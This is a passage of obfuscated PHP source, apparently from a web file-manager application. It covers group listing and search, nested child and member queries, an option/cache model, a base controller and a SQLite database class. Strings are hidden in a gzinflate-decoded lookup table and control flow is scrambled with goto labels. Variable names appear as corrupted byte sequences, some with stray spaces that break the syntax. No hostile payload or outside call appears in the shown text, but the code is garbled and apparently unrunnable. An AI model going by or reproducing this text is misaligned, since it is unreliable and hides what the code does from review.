"{$f∏‚ÉÇÏ≥ﬂ}\40{$eﬁã◊¢ïÜŸ}\54\x20\x67\162\x6f\165\x70\111\x44\40\141\163\143"; return $this->order($Eåè∞∏ÊÃ∑); goto B‹„∑âô¥‚; Aﬁ÷–¥û‚ñ: $f∏‚ÉÇÏ≥ﬂ = Input::get($Fàèı√Ω·≈[1556], $Fàèı√Ω·≈[7], $Fàèı√Ω·≈[1598], $eôë¨ôÇéÿ); $eﬁã◊¢ïÜŸ = Input::get($Fàèı√Ω·≈[1558], $Fàèı√Ω·≈[7], $Fàèı√Ω·≈[1603], array($Fàèı√Ω·≈[1603], $Fàèı√Ω·≈[1484])); $eﬁã◊¢ïÜŸ = $B±›ÆﬂÕ™„[$eﬁã◊¢ïÜŸ]; goto eÂ Ü”Çó™; CÍêÔÆÆ…∑: $Fàèı√Ω·≈ =& $_SERVER[∞„˜ƒÑºª]; $eôë¨ôÇéÿ = array($Fàèı√Ω·≈[1516], $Fàèı√Ω·≈[28], $Fàèı√Ω·≈[1502], $Fàèı√Ω·≈[183]); $B±›ÆﬂÕ™„ = array($Fàèı√Ω·≈[1601] => $Fàèı√Ω·≈[1602], $Fàèı√Ω·≈[1484] => $Fàèı√Ω·≈[1560]); goto Aﬁ÷–¥û‚ñ; B‹„∑âô¥‚: } public function listChild($FîÊËòı˜Ë) { $a”ƒ∂∫√®≤ =& $_SERVER[∞„˜ƒÑºª]; $b™ΩÉ÷àûõ = $this->where(array($a”ƒ∂∫√®≤[384] => $FîÊËòı˜Ë))->_makeOrder()->selectPage(200); $this->_listDataApply($b™ΩÉ÷àûõ[$a”ƒ∂∫√®≤[354]]); return $b™ΩÉ÷àûõ; } public function listByID($f„ØÍ–ÿ„∂) { $Fó—ÿ“È∞‰ =& $_SERVER[∞„˜ƒÑºª]; if (!$f„ØÍ–ÿ„∂) { return array(); } $d÷æ§õ…œê = array($Fó—ÿ“È∞‰[1516] => array($Fó—ÿ“È∞‰[7], $f„ØÍ–ÿ„∂)); $c∏ƒ≠°ˆÿ∆ = $this->where($d÷æ§õ…œê)->select(); $this->_listDataApply($c∏ƒ≠°ˆÿ∆); return $c∏ƒ≠°ˆÿ∆; } public function listSearch($fËÚÜã¨∏‘) { goto bÃ»ß¡˘πÓ; E’Ô›£÷êé: $this->_listDataApply($eπûÕÿÙ∫’[$E‘óâ Â∆µ[354]]); return $eπûÕÿÙ∫’; goto aÂ•ÖÚ‡ÜÇ; C•–”ìáü: if (!trim($A‚Ñ“√‹ﬁ„)) { return !1; } $A‚Ñ“√‹ﬁ„ = str_replace($E‘óâ Â∆µ[1606], $E‘óâ Â∆µ[1607], $A‚Ñ“√‹ﬁ„); $c´‡Øë‰◊å = array($E‘óâ Â∆µ[1516] => array($E‘óâ Â∆µ[519], "\x25{$A‚Ñ“√‹ﬁ„}\45"), $E‘óâ Â∆µ[28] => array($E‘óâ Â∆µ[519], "\x25{$A‚Ñ“√‹ﬁ„}\45"), $E‘óâ Â∆µ[674] => $E‘óâ Â∆µ[1608]); goto DΩÕπµ≤ãÉ; DΩÕπµ≤ãÉ: $eπûÕÿÙ∫’ = $this->_makeOrder()->where($c´‡Øë‰◊å)->selectPage(20); $eπûÕÿÙ∫’ = $eπûÕÿÙ∫’ ? $eπûÕÿÙ∫’ : array(); if (!$eπûÕÿÙ∫’ || count($eπûÕÿÙ∫’[$E‘óâ Â∆µ[354]]) < 5 && Input::check($A‚Ñ“√‹ﬁ„, $E‘óâ Â∆µ[305])) { $Dá—∂ñπÁì = $this->_searchFromMeta($E‘óâ Â∆µ[405], $A‚Ñ“√‹ﬁ„, 10); $E∑îÀö∫À‡ = $this->_searchFromMeta($E‘óâ Â∆µ[404], $A‚Ñ“√‹ﬁ„, 10); $b±Ÿö◊ì√´ = array_merge($Dá—∂ñπÁì, $E∑îÀö∫À‡, $eπûÕÿÙ∫’[$E‘óâ Â∆µ[354]]); $eπûÕÿÙ∫’[$E‘óâ Â∆µ[354]] = array_unique_by_key($b±Ÿö◊ì√´, $E‘óâ Â∆µ[1516]); $eπûÕÿÙ∫’[$E‘óâ Â∆µ[351]][$E‘óâ Â∆µ[352]] = count($eπûÕÿÙ∫’[$E‘óâ Â∆µ[354]]); $eπûÕÿÙ∫’[$E‘óâ Â∆µ[351]][$E‘óâ Â∆µ[353]] = ceil($eπûÕÿÙ∫’[$E‘óâ Â∆µ[351]][$E‘óâ Â∆µ[352]] / $eπûÕÿÙ∫’[$E‘óâ Â∆µ[351]][$E‘óâ Â∆µ[349]]); } goto E’Ô›£÷êé; bÃ»ß¡˘πÓ: $E‘óâ Â∆µ =& $_SERVER[∞„˜ƒÑºª]; $A‚Ñ“√‹ﬁ„ = $fËÚÜã¨∏‘[$E‘óâ Â∆µ[1604]]; $AØÚ–éàçÈ = isset($fËÚÜã¨∏‘[$E‘óâ Â∆µ[1605]]) ? $fËÚÜã¨∏‘[$E‘óâ Â∆µ[1605]] : !1; goto C•–”ìáü; aÂ•ÖÚ‡ÜÇ: } private function _searchFromMeta($f–‚†õ”ñÑ, $F∑Ã∫ã‹ãƒ, $BÈÏºàÛÙœ) { goto Fº’Øï≠≠≤; Aàªóª¿çÜ: $E¬æå»üäπ = $this->where(array($b‹ŒÚ∫ ÕÁ[1598] => array($b‹ŒÚ∫ ÕÁ[7], $CÉ·òû°ñ‡)))->select(); if (!$E¬æå»üäπ) { return array(); } return $E¬æå»üäπ; goto EÊ¯ùÜ¿ËÖ; Fº’Øï≠≠≤: $b‹ŒÚ∫ ÕÁ =& $_SERVER[∞„˜ƒÑºª]; $F∑Ã∫ã‹ãƒ = strtolower($F∑Ã∫ã‹ãƒ); $eçÚ“´ï∑ª = array($b‹ŒÚ∫ ÕÁ[96] => $f–‚†õ”ñÑ, $b‹ŒÚ∫ ÕÁ[357] => array($b‹ŒÚ∫ ÕÁ[519], "\x25{$F∑Ã∫ã‹ãƒ}\x25")); goto BÀöàûŒëÇ; BÀöàûŒëÇ: $CÉ·òû°ñ‡ = Model($b‹ŒÚ∫ ÕÁ[1609])->where($eçÚ“´ï∑ª)->limit($BÈÏºàÛÙœ)->select(); if (!$CÉ·òû°ñ‡) { return array(); } $CÉ·òû°ñ‡ = array_to_keyvalue($CÉ·òû°ñ‡, $b‹ŒÚ∫ ÕÁ[33], $b‹ŒÚ∫ ÕÁ[1516]); goto Aàªóª¿çÜ; EÊ¯ùÜ¿ËÖ: } protected function _listDataApplyItem($CﬁŸ›Ö‚ô°) { $d†ÛÙœ£˜¬ = array($CﬁŸ›Ö‚ô°); $this->_listDataApply($d†ÛÙœ£˜¬); return $d†ÛÙœ£˜¬[0]; } protected function _listDataApply(&$b“óÏã¬åê) { goto eêõâÑ–¨π; eêõâÑ–¨π: $fâÍ†ÁΩá =& $_SERVER[∞„˜ƒÑºª]; if (!$b“óÏã¬åê) { return; } $aÁﬂ€éˆÓΩ = array_to_keyvalue($b“óÏã¬åê, $fâÍ†ÁΩá[33], $fâÍ†ÁΩá[1516]); goto E°Ëê≠“çœ; c¢»Ñåú¨Ü: $this->_listAppendParent($b“óÏã¬åê); $this->_listAppendSourceRoot($b“óÏã¬åê, $aÁﬂ€éˆÓΩ); goto c‚ˆ∏Ç∑Âÿ; E°Ëê≠“çœ: $this->_listAppendChildren($b“óÏã¬åê); $this->_listAppendChildrenMember($b“óÏã¬åê); $this->_listAppendMeta($b“óÏã¬åê, $aÁﬂ€éˆÓΩ); goto c¢»Ñåú¨Ü; c‚ˆ∏Ç∑Âÿ: } private function _listAppendChildren(&$Bù”œ±É∑ë) { goto BÛÕ™µïâÎ; cñπ¯Ωê‡ç: $eØÎ≠Ùåà¡ = count($Bù”œ±É∑ë); $f“‡Ü†õíñ = $this->tablePrefix . $this->tableName; for ($d˜∞ë‹Ωñ« = 0, $CﬁÉÑÖﬂÜ’ = 0; $d˜∞ë‹Ωñ« < $eØÎ≠Ùåà¡; $d˜∞ë‹Ωñ«++) { $CﬁÉÑÖﬂÜ’++; $bˆá√∂äÙ™ = $Bù”œ±É∑ë[$d˜∞ë‹Ωñ«][$CÔÑ§ˆ≤ìá[1516]]; $E˘úÖÏ¢∂– .= "\x53\105\x4c\105\x43\x54\x20\x2a\40\106\122\117\115\x20\x28\123\x45\114\105\x43\124\40\47{$bˆá√∂äÙ™}\137\143\x68\151\154\144\47\x20\141\x73\x20\150\141\163\40\106\x52\x4f\115\40\x60{$f“‡Ü†õíñ}\x60\40\x77\150\x65\x72\145\40\160\x61\x72\x65\x6e\164\111\x44\x3d{$bˆá√∂äÙ™}\40\154\x69\155\x69\164\40\61\x29\x20\x61\x73\40\x74\x62\x5f{$bˆá√∂äÙ™}\x20\x75\x6e\x69\157\156\x20\141\x6c\x6c\40"; if (($CﬁÉÑÖﬂÜ’ >= 20 || $d˜∞ë‹Ωñ« == $eØÎ≠Ùåà¡ - 1) && $E˘úÖÏ¢∂–) { $E˘úÖÏ¢∂– = substr($E˘úÖÏ¢∂–, 0, -strlen($CÔÑ§ˆ≤ìá[1610])); $F…ä‹ÀàÖŸ = $this->query($E˘úÖÏ¢∂–); $d¬Ü ÃÛç˘ = array_merge($d¬Ü ÃÛç˘, $F…ä‹ÀàÖŸ); $CﬁÉÑÖﬂÜ’ = 0; $E˘úÖÏ¢∂– = $CÔÑ§ˆ≤ìá[33]; } } goto bí®ÕßÎŒç; BÛÕ™µïâÎ: $CÔÑ§ˆ≤ìá =& $_SERVER[∞„˜ƒÑºª]; $E˘úÖÏ¢∂– = $CÔÑ§ˆ≤ìá[361]; $d¬Ü ÃÛç˘ = array(); goto cñπ¯Ωê‡ç; bí®ÕßÎŒç: $d¬Ü ÃÛç˘ = array_to_keyvalue($d¬Ü ÃÛç˘, $CÔÑ§ˆ≤ìá[1611]); foreach ($Bù”œ±É∑ë as &$fÛèŒÓ†©Ö) { $fÛèŒÓ†©Ö[$CÔÑ§ˆ≤ìá[1612]] = isset($d¬Ü ÃÛç˘[$fÛèŒÓ†©Ö[$CÔÑ§ˆ≤ìá[1516]] . $CÔÑ§ˆ≤ìá[1613]]); } goto f∏∞ïËâôŸ; f∏∞ïËâôŸ: } private function _listAppendChildrenMember(&$BÔç”∫ùŸ‹) { goto e∂Áπ£⁄ΩÚ; bû†üı¯Ï¿: $B±Ì©ÇâÉã = array_to_keyvalue($B±Ì©ÇâÉã, $b≤…êÉáÇâ[1611]); foreach ($BÔç”∫ùŸ‹ as &$fÜ˘£™õ∑ƒ) { $fÜ˘£™õ∑ƒ[$b≤…êÉáÇâ[1614]] = isset($B±Ì©ÇâÉã[$fÜ˘£™õ∑ƒ[$b≤…êÉáÇâ[1516]] . $b≤…êÉáÇâ[1613]]); } goto Bı∏∑ï¨ä∞; d›≈êû‘ë»: $Aû’êáØÊÿ = count($BÔç”∫ùŸ‹); $BÉà∫‡Ôµù = $this->tablePrefix . $b≤…êÉáÇâ[1600]; for ($d∂ıÀ◊—è« = 0, $d°ƒ£⁄Óëã = 0; $d∂ıÀ◊—è« < $Aû’êáØÊÿ; $d∂ıÀ◊—è«++) { $d°ƒ£⁄Óëã++; $b√£π·á‘¡ = $BÔç”∫ùŸ‹[$d∂ıÀ◊—è«][$b≤…êÉáÇâ[1516]]; $eıµ¡ˆ©´ .= "\123\105\114\105\103\124\40\x2a\40\x46\122\x4f\115\x20\x28\x53\x45\114\105\103\x54\40\47{$b√£π·á‘¡}\137\143\x68\x69\154\x64\47\40\x61\x73\x20\x68\x61\163\40\x46\x52\x4f\115\40\140{$BÉà∫‡Ôµù}\140\40\x77\150\145\x72\145\x20\x67\x72\157\165\160\x49\x44\x3d{$b√£π·á‘¡}\40\154\x69\x6d\151\x74\40\x31\51\40\141\163\40\164\x62\x5f{$b√£π·á‘¡}\x20\165\x6e\151\157\x6e\40\141\x6c\154\x20"; if (($d°ƒ£⁄Óëã >= 20 || $d∂ıÀ◊—è« == $Aû’êáØÊÿ - 1) && $eıµ¡ˆ©´) { $eıµ¡ˆ©´ = substr($eıµ¡ˆ©´, 0, -strlen($b≤…êÉáÇâ[1610])); $A÷Ø’¯Ç≤± = $this->query($eıµ¡ˆ©´); $B±Ì©ÇâÉã = array_merge($B±Ì©ÇâÉã, $A÷Ø’¯Ç≤±); $d°ƒ£⁄Óëã = 0; $eıµ¡ˆ©´ = $b≤…êÉáÇâ[33]; } } goto bû†üı¯Ï¿; e∂Áπ£⁄ΩÚ: $b≤…êÉáÇâ =& $_SERVER[∞„˜ƒÑºª]; $eıµ¡ˆ©´ = $b≤…êÉáÇâ[361]; $B±Ì©ÇâÉã = array(); goto d›≈êû‘ë»; Bı∏∑ï¨ä∞: } private function _listAppendMeta(&$D„±È‘ıÑı, $FîÀîß∏™Ö) { $bì›ŸöéàÖ =& $_SERVER[∞„˜ƒÑºª]; $aá≈›‚§’Æ = array($bì›ŸöéàÖ[1516] => array($bì›ŸöéàÖ[7], $FîÀîß∏™Ö)); $c¨Õì⁄æ©Ç = Model($bì›ŸöéàÖ[1599])->where($aá≈›‚§’Æ)->select(); $c¨Õì⁄æ©Ç = array_to_keyvalue_group($c¨Õì⁄æ©Ç, $bì›ŸöéàÖ[1516]); foreach ($c¨Õì⁄æ©Ç as &$EÒœï„ÇÆ“) { $EÒœï„ÇÆ“ = array_to_keyvalue($EÒœï„ÇÆ“, $bì›ŸöéàÖ[96], $bì›ŸöéàÖ[357]); } foreach ($D„±È‘ıÑı as &$c◊Œ∆áßéÔ) { $c◊Œ∆áßéÔ[$bì›ŸöéàÖ[1562]] = array(); if (isset($c¨Õì⁄æ©Ç[$c◊Œ∆áßéÔ[$bì›ŸöéàÖ[1516]]])) { $c◊Œ∆áßéÔ[$bì›ŸöéàÖ[1562]] = $c¨Õì⁄æ©Ç[$c◊Œ∆áßéÔ[$bì›ŸöéàÖ[1516]]]; } } } protected function parentLevelArray($e€’œ≤ê¥Õ) { $Aÿ’ÖﬁÙ∏” =& $_SERVER[∞„˜ƒÑºª]; $e€’œ≤ê¥Õ = explode($Aÿ’ÖﬁÙ∏”[47], trim($e€’œ≤ê¥Õ, $Aÿ’ÖﬁÙ∏”[47])); $e€’œ≤ê¥Õ = array_remove_value($e€’œ≤ê¥Õ, $Aÿ’ÖﬁÙ∏”[402]); return $e€’œ≤ê¥Õ; } private function _listAppendParent(&$A Ç‡Öƒîõ) { goto BÌáÿ„øÊ„; aÕ¡Ñ–ÿë√: $A°•›îﬂ’  = array(); foreach ($Dùäƒ˜´éí as $A≈ÚÂ’§ÉÚ => $F£Ú‡ñÇ´ú) { if (!$F£Ú‡ñÇ´ú) { $A°•›îﬂ’ [] = $A≈ÚÂ’§ÉÚ; } } if ($A°•›îﬂ’ ) { $CÌÇïöÑı¶ = array($aƒãåñö◊—[1598] => array($aƒãåñö◊—[951], $A°•›îﬂ’ )); $FÔÜ∂Çãòπ = $this->field($aƒãåñö◊—[1615])->where($CÌÇïöÑı¶)->select(); $FºÆ›’ó∑ë = array_to_keyvalue($FÔÜ∂Çãòπ, $aƒãåñö◊—[1516], $aƒãåñö◊—[28]); $Dùäƒ˜´éí = array_merge_index($Dùäƒ˜´éí, $FºÆ›’ó∑ë); } goto CΩÎ∏öìèç; BÌáÿ„øÊ„: $aƒãåñö◊— =& $_SERVER[∞„˜ƒÑºª]; $Dùäƒ˜´éí = array(); foreach ($A Ç‡Öƒîõ as &$Bî‘†ù‰êï) { $Dùäƒ˜´éí[$Bî‘†ù‰êï[$aƒãåñö◊—[1516]]] = $Bî‘†ù‰êï[$aƒãåñö◊—[28]]; $aŒ£ﬂ≤†∏„ = $this->parentLevelArray($Bî‘†ù‰êï[$aƒãåñö◊—[373]]); foreach ($aŒ£ﬂ≤†∏„ as $d€ôöº‰ûÉ) { if (!isset($Dùäƒ˜´éí[$d€ôöº‰ûÉ])) { $Dùäƒ˜´éí[$d€ôöº‰ûÉ] = 0; } } } goto aÕ¡Ñ–ÿë√; CΩÎ∏öìèç: foreach ($A Ç‡Öƒîõ as &$Bî‘†ù‰êï) { $aŒ£ﬂ≤†∏„ = $this->parentLevelArray($Bî‘†ù‰êï[$aƒãåñö◊—[373]]); $fí§§éÍ÷√ = $aƒãåñö◊—[33]; foreach ($aŒ£ﬂ≤†∏„ as $d€ôöº‰ûÉ) { $fí§§éÍ÷√ .= $Dùäƒ˜´éí[$d€ôöº‰ûÉ] . $aƒãåñö◊—[8]; } if ($aŒ£ﬂ≤†∏„) { $fí§§éÍ÷√ .= $Bî‘†ù‰êï[$aƒãåñö◊—[28]]; } $Bî‘†ù‰êï[$aƒãåñö◊—[1616]] = str_replace($aƒãåñö◊—[1295], $aƒãåñö◊—[8], $fí§§éÍ÷√); } goto dÔñèú∆Éá; dÔñèú∆Éá: } private function _listAppendSourceRoot(&$F”Ω˜ΩÒ°¯, $BÒßò…ßç‹) { $cêá∞ã®∆ø =& $_SERVER[∞„˜ƒÑºª]; $BÓßÍÂÈõ÷ = array($cêá∞ã®∆ø[393] => SourceModel::TYPE_GROUP, $cêá∞ã®∆ø[384] => 0, $cêá∞ã®∆ø[395] => array($cêá∞ã®∆ø[7], $BÒßò…ßç‹)); $eÉ—∑Ì≠ù° = Model($cêá∞ã®∆ø[520])->field($cêá∞ã®∆ø[1617])->where($BÓßÍÂÈõ÷)->select(); $eÉ—∑Ì≠ù° = array_to_keyvalue($eÉ—∑Ì≠ù°, $cêá∞ã®∆ø[395]); $eÉ—∑Ì≠ù° = array_remove_key($eÉ—∑Ì≠ù°, $cêá∞ã®∆ø[395]); foreach ($F”Ω˜ΩÒ°¯ as &$E•å“ãﬂú‰) { $E•å“ãﬂú‰[$cêá∞ã®∆ø[1618]] = $eÉ—∑Ì≠ù°[$E•å“ãﬂú‰[$cêá∞ã®∆ø[1516]]] ? $eÉ—∑Ì≠ù°[$E•å“ãﬂú‰[$cêá∞ã®∆ø[1516]]] : array(); } } protected function resetParentLevel() { $eÙ©ÖäñÓä =& $_SERVER[∞„˜ƒÑºª]; $dñÜÒ„áÒå = $eÙ©ÖäñÓä[1516]; $dêÏÀéå’Ù = $this->select(); $dêÏÀéå’Ù = array_to_keyvalue($dêÏÀéå’Ù, $dñÜÒ„áÒå); foreach ($dêÏÀéå’Ù as $b≠¡ÿòâ∑„) { goto C≥Îä¶»◊â; C≥Îä¶»◊â: $fªº¯«ôÎΩ = $b≠¡ÿòâ∑„; $bø’ãøÑã¢ = array(); while ($fªº¯«ôÎΩ[$eÙ©ÖäñÓä[384]] != 0) { $bø’ãøÑã¢[] = $fªº¯«ôÎΩ[$eÙ©ÖäñÓä[384]]; $fªº¯«ôÎΩ = $dêÏÀéå’Ù[$fªº¯«ôÎΩ[$eÙ©ÖäñÓä[384]]]; } goto CÀ…É≠Ààö; A„±åùƒ∑: $this->where(array($dñÜÒ„áÒå => $b≠¡ÿòâ∑„[$dñÜÒ„áÒå]))->save(array($eÙ©ÖäñÓä[399] => $bø’ãøÑã¢)); goto eΩèâïœÍ◊; CÀ…É≠Ààö: $bø’ãøÑã¢[] = 0; $bø’ãøÑã¢ = $eÙ©ÖäñÓä[47] . implode($eÙ©ÖäñÓä[47], array_reverse($bø’ãøÑã¢)) . $eÙ©ÖäñÓä[47]; $this->setNamePinyin($b≠¡ÿòâ∑„[$dñÜÒ„áÒå], $b≠¡ÿòâ∑„[$eÙ©ÖäñÓä[28]]); goto A„±åùƒ∑; eΩèâïœÍ◊: } return $dêÏÀéå’Ù; } public function groupNameAuto($búéø≤¿‘≤, $A¨Ó…≠ô≠) { $cß‹êŒ•©’ =& $_SERVER[∞„˜ƒÑºª]; $aÈùûá•Ã« = $this->where(array($cß‹êŒ•©’[398] => $búéø≤¿‘≤))->getField($cß‹êŒ•©’[28], !0); if (!$aÈùûá•Ã« || !in_array($A¨Ó…≠ô≠, $aÈùûá•Ã«)) { return $A¨Ó…≠ô≠; } for ($EîÜÌ”â˜ñ = 1; $EîÜÌ”â˜ñ <= count($aÈùûá•Ã«) + 1; $EîÜÌ”â˜ñ++) { $e∂ã¶≤íù¯ = $A¨Ó…≠ô≠ . "\50{$EîÜÌ”â˜ñ}\x29"; if (!in_array($e∂ã¶≤íù¯, $aÈùûá•Ã«)) { return $e∂ã¶≤íù¯; } } } } define($_SERVER[∞„˜ƒÑºª][1619], $_SERVER[∞„˜ƒÑºª][1620]); $_SERVER[©Ç‡ÆÑ„òπ] = explode($_SERVER[∞„˜ƒÑºª][1621], gzinflate(substr($_SERVER[∞„˜ƒÑºª][1622], 10, -8))); goto CÇ’·≈ß•ã; D«⁄†¯Ê≠ë: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($bëæÖÉ‚†Ã = false, $fﬂ®ª¶¡Ÿ = '', $Dë∏∫ÜÖ»√ = false) { goto d§°´Ë µË; b±ÍÖø÷÷ : $dàΩ¬ÊüÍå = $this->filterWhere(array($Dﬁ çŒóèê[29] => $fﬂ®ª¶¡Ÿ)); $eíä∏˜Òﬁ¢ = $this->where($dàΩ¬ÊüÍå)->select(); $eíä∏˜Òﬁ¢ = array_to_keyvalue($eíä∏˜Òﬁ¢, $Dﬁ çŒóèê[96], $Dﬁ çŒóèê[357]); goto B®ÿè∞ä÷’; B®ÿè∞ä÷’: foreach ($eíä∏˜Òﬁ¢ as $E∂€óÉËπ¥ => $B√ËÑ±§ªè) { if ($Dë∏∫ÜÖ»√ || in_array($E∂€óÉËπ¥, $this->jsonField)) { $eíä∏˜Òﬁ¢[$E∂€óÉËπ¥] = json_decode($eíä∏˜Òﬁ¢[$E∂€óÉËπ¥], !0); } } $this->cacheAction($Dﬁ çŒóèê[367], $fﬂ®ª¶¡Ÿ, $eíä∏˜Òﬁ¢); return $bëæÖÉ‚†Ã ? $eíä∏˜Òﬁ¢[$bëæÖÉ‚†Ã] : $eíä∏˜Òﬁ¢; goto A£Õ—ΩÖ‘Ó; d§°´Ë µË: $Dﬁ çŒóèê =& $_SERVER[∞„˜ƒÑºª]; $eíä∏˜Òﬁ¢ = $this->cacheAction($Dﬁ çŒóèê[176], $fﬂ®ª¶¡Ÿ); if (is_array($eíä∏˜Òﬁ¢)) { return $bëæÖÉ‚†Ã ? $eíä∏˜Òﬁ¢[$bëæÖÉ‚†Ã] : $eíä∏˜Òﬁ¢; } goto b±ÍÖø÷÷ ; A£Õ—ΩÖ‘Ó: } public function set($bŒÌﬁãá«Ñ, $dÜÆ°ÎπÒ— = false, $f‘∞ã÷±‚Ë = '') { $E¬ïËÓçﬂå =& $_SERVER[∞„˜ƒÑºª]; $this->cacheAction($E¬ïËÓçﬂå[368], $f‘∞ã÷±‚Ë); $FêﬂÒ‹éœ› = array(); $Aòñãâö‡ä = is_array($bŒÌﬁãá«Ñ) ? $bŒÌﬁãá«Ñ : array($bŒÌﬁãá«Ñ => $dÜÆ°ÎπÒ—); foreach ($Aòñãâö‡ä as $bŒÌﬁãá«Ñ => $A‹ó·üá‚÷) { if (is_array($A‹ó·üá‚÷)) { $A‹ó·üá‚÷ = json_encode_force($A‹ó·üá‚÷); } $A‹ó·üá‚÷ = self::textEncode($A‹ó·üá‚÷); $Aòñãâö‡ä = array($E¬ïËÓçﬂå[29] => $f‘∞ã÷±‚Ë, $E¬ïËÓçﬂå[96] => $bŒÌﬁãá«Ñ, $E¬ïËÓçﬂå[357] => $A‹ó·üá‚÷); $FêﬂÒ‹éœ›[] = $this->filterWhere($Aòñãâö‡ä); } return $this->addAll($FêﬂÒ‹éœ›, array(), !0); } public function setDeep($dü≥’Á÷°¿, $BÔùãÑ±‡≥ = false, $bçÊ…ù˜ŒÖ = '') { $Aó∞≤öû™© = explode($_SERVER[∞„˜ƒÑºª][98], $dü≥’Á÷°¿); $c¬ä·ç™†› = $this->get(); array_set_value($c¬ä·ç™†›, $dü≥’Á÷°¿, $BÔùãÑ±‡≥); $this->set($Aó∞≤öû™©[0], $c¬ä·ç™†›[$Aó∞≤öû™©[0]], $bçÊ…ù˜ŒÖ); } public function remove($FíÇΩÕûîê, $DùÂíÂÂô¥ = '') { $FØ€ß∆‰æâ =& $_SERVER[∞„˜ƒÑºª]; $this->cacheAction($FØ€ß∆‰æâ[368], $DùÂíÂÂô¥); $bá§≠çßñª = $this->filterWhere(array($FØ€ß∆‰æâ[96] => $FíÇΩÕûîê, $FØ€ß∆‰æâ[29] => $DùÂíÂÂô¥)); if (is_null($FíÇΩÕûîê)) { unset($bá§≠çßñª[$FØ€ß∆‰æâ[96]]); } return $this->where($bá§≠çßñª)->delete(); } public function cacheAction($Bë†—Õÿ©è, $Aë⁄íºÚ—Ó, $F√®èÆ±¯© = false) { $FêÎº¡àéË =& $_SERVER[∞„˜ƒÑºª]; $bâ°∫£∏Ç… = $this->cacheKey($Aë⁄íºÚ—Ó); switch ($Bë†—Õÿ©è) { case $FêÎº¡àéË[176]: $aÒ©ããÉ‰… = Cache::get($bâ°∫£∏Ç…); break; case $FêÎº¡àéË[367]: $aÒ©ããÉ‰… = Cache::set($bâ°∫£∏Ç…, $F√®èÆ±¯©); break; case $FêÎº¡àéË[368]: $aÒ©ããÉ‰… = Cache::remove($bâ°∫£∏Ç…); break; } return $aÒ©ããÉ‰…; } protected function filterWhere($b›ﬁ¡áî®ô) { return $b›ﬁ¡áî®ô; } protected function cacheKey($aèÛÇÏë°é) { return $aèÛÇÏë°é; } } define($_SERVER[∞„˜ƒÑºª][369], $_SERVER[∞„˜ƒÑºª][370]); $_SERVER[á≠«ÈüÊıæ¸›] = explode($_SERVER[∞„˜ƒÑºª][371], gzinflate(substr($_SERVER[∞„˜ƒÑºª][372], 10, -8))); goto Aﬂ¿◊≤≠Ñã; bÎ◊∏Ô∫œ¨: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto d∫ÕÈåŒ¬ó; AùòçÍáâã: $this->in =& $in; $this->values[$bÆ°Á∂í¥ñ[6]] =& $config; $this->values[$bÆ°Á∂í¥ñ[7]] =& $in; goto Cú≈òÍô«õ; Cú≈òÍô«õ: $this->tpl = TEMPLATE . MOD . $bÆ°Á∂í¥ñ[8]; $this->_classObjectID = mt_rand(0, 10000); goto AÛË°¥˜¨Á; d∫ÕÈåŒ¬ó: $bÆ°Á∂í¥ñ =& $_SERVER[∞„˜ƒÑºª]; global $in, $config; $this->config =& $config; goto AùòçÍáâã; AÛË°¥˜¨Á: } public function loadClass($c—„ÿÊ·õ–) { if (1 === func_num_args()) { $this->{$c—„ÿÊ·õ–} = new $c—„ÿÊ·õ–(); } else { $a‡˜ÎÃ‡Œá = new ReflectionClass($c—„ÿÊ·õ–); $bÙ‚ºÕ´Áæ = func_get_args(); array_shift($bÙ‚ºÕ´Áæ); $this->{$c—„ÿÊ·õ–} = $a‡˜ÎÃ‡Œá->newInstanceArgs($bÙ‚ºÕ´Áæ); } return $this->{$c—„ÿÊ·õ–}; } protected function assign($B˘ŸÖÓ‚À⁄, $Bı‹âÚı´ú) { $this->values[$B˘ŸÖÓ‚À⁄] = $Bı‹âÚı´ú; } protected function display($F±˘«·Ú“ö) { ob_end_clean(); extract($this->values); require $this->tpl . $F±˘«·Ú“ö; } } class DbSqliteBase extends Db { public function __construct($B´…Ù¯üÇ˘ = '') { $dÑﬁãù„‘† =& $_SERVER[∞„˜ƒÑºª]; if (!extension_loaded($dÑﬁãù„‘†[9])) { think_exception(think_lang($dÑﬁãù„‘†[10]) . $dÑﬁãù„‘†[11]); } if (!empty($B´…Ù¯üÇ˘)) { if (!isset($B´…Ù¯üÇ˘[$dÑﬁãù„‘†[12]])) { $B´…Ù¯üÇ˘[$dÑﬁãù„‘†[12]] = 438; } $this->config = $B´…Ù¯üÇ˘; if (empty($this->config[$dÑﬁãù„‘†[13]])) { $this->config[$dÑﬁãù„‘†[13]] = array(); } } } public function connect($eè€€éßºó = '', $AŒüá≈¶—´ = 0) { $d‘úÚ¯Òî =& $_SERVER[∞„˜ƒÑºª]; if (!isset($this->linkID[$AŒüá≈¶—´])) { goto eË∂â√âçÂ; b‚™º—í„˜: @sqlite_busy_timeout($this->linkID[$AŒüá≈¶—´], 30000); if (1 != think_config($d‘úÚ¯Òî[18])) { unset($this->config); } goto DŸ®⁄ë€Îø; cﬁ‘¡éØ¢é: $this->linkID[$AŒüá≈¶—´] = $E∞∞™¡£¢µ($eè€€éßºó[$d‘úÚ¯Òî[17]], $eè€€éßºó[$d‘úÚ¯Òî[12]]); if (!$this->linkID[$AŒüá≈¶—´]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto b‚™º—í„˜; eË∂â√âçÂ: if (empty($eè€€éßºó)) { $eè€€éßºó = $this->config; } $C±ÉãÔò—È = !empty($eè€€éßºó[$d‘úÚ¯Òî[13]][$d‘úÚ¯Òî[14]]) ? $eè€€éßºó[$d‘úÚ¯Òî[13]][$d‘úÚ¯Òî[14]] : $this->pconnect; $E∞∞™¡£¢µ = $C±ÉãÔò—È ? $d‘úÚ¯Òî[15] : $d‘úÚ¯Òî[16]; goto cﬁ‘¡éØ¢é; DŸ®⁄ë€Îø: } return $this->linkID[$AŒüá≈¶—´]; } public function free() { $this->queryID = null; } public function query($fÁïèµÿÖñ) { goto F·‚¶∆Ü; Fºªõà∫áﬂ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $BŸÈ√∂©èé = $this->getAll(); return $BŸÈ√∂©èé; } goto Bç√êâ†£¡; F·‚¶∆Ü: $EÁ“Ü≠‹èã =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AòÛæ÷“¥—; AòÛæ÷“¥—: $this->queryStr = $fÁïèµÿÖñ; if ($this->queryID) { $this->free(); } think_action_status($EÁ“Ü≠‹èã[19], 1); goto bÙ–¨°ª”œ; bÙ–¨°ª”œ: 